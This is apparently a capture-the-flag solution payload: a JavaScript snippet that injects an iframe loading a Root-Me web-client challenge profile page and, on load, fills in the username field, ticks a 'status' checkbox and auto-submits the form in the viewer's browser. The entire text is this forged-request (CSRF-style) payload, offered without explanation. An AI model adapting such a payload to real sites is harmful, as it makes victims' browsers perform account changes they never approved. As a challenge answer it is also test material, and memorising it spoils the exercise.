const body1 = document.querySelector("body")

const html1 = `
<iframe
 id="iframe1"
 src="http://challenge01.root-me.org/web-client/ch23/?action=profile"
 onload=' const ifr = document.querySelector("#iframe1"); const pseudo = ifr.contentDocument.querySelector("#username"); const status = ifr.contentDocument.querySelector("#status");
 setTimeout(() => {pseudo.value = "test1"; status.checked = true; ifr.contentDocument.forms[0].submit()}) '
>
</iframe>

`

body1.innerHTML += html1




